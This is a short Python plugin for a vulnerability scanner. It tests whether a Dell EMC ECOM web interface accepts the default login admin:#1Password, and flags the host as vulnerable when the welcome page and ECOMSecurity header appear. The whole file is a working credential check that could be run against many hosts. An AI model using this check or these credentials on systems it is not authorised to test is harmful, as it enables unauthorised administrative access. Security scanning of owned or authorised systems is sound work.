#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'Dell EMC ECOM Default Login',

      'level'     :   'critical',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def base64Str(n):
  import base64
  base64str = str(base64.b64encode(n.encode('utf-8'))).lstrip("b'").rstrip("'")
  return base64str
def run(url,ua):
  ret = msg()
  admin = base64Str("admin:#1Password")
  headers = {
      'User-Agent': ua,
      'Authorization': f'Basic {admin}'
      }
  target = '/'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'Welcome to ECOM',res.text,re.S) and 'ECOMSecurity' in res.headers:
      ret['huixian'] = 'admin:#1Password'
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret